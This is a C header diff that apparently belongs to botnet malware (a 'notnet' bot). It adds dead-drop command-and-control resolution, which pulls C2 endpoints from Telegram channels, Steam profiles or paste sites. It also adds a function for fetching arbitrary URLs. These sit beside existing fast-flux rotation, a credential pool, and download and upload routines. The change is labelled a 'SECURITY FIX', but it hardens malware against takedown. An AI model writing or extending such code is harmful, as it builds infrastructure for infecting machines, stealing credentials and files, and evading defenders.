@@ -118,6 +118,16 @@ typedef struct {
     uint8_t flux_enabled;
     uint32_t flux_ttl;   /* seconds between re-resolution + rotation */
     
+    /* SECURITY FIX (#86): Dead-drop C2 resolution. When dead_drop_url is
+     * set, the bot fetches an opaque C2-endpoint blob from a legitimate
+     * service (Telegram channel, Steam profile, pastebin-style HTTP) at
+     * boot and every dead_drop_interval seconds. The blob is applied only
+     * if it echoes the shared c2_secret (see secret) — a fetch that fails,
+     * is malformed, or does not verify leaves the static endpoints intact
+     * (fail-closed). Empty dead_drop_url = disabled. */
+    char dead_drop_url[512];
+    uint32_t dead_drop_interval;   /* seconds between re-resolution */
+    
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
@@ -217,6 +227,14 @@ int http_post(notnet_bot_t *bot, const char *data, int len);
  * must locate the "\r\n\r\n" header terminator themselves (as
  * protocol_process_commands and http_download already do). */
 int http_get(notnet_bot_t *bot, char *buf, int len);
+/* Dead-drop / arbitrary-URL fetch (#86): GET a plaintext http:// URL into
+ * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
+ * return the total bytes received (full response — status, headers, body;
+ * caller strips the "\r\n\r\n" terminator). Unlike http_get() this does not
+ * require an existing C2 connection and can target any host. Cleartext only
+ * (the default build has no TLS); callers must NOT treat the transport as a
+ * trust boundary. Returns -1 on failure, non-2xx, or empty body. */
+int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
 int http_read(notnet_bot_t *bot, char *buf, int len);
 int http_download(notnet_bot_t *bot, const char *url, const char *dest);
 int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path);
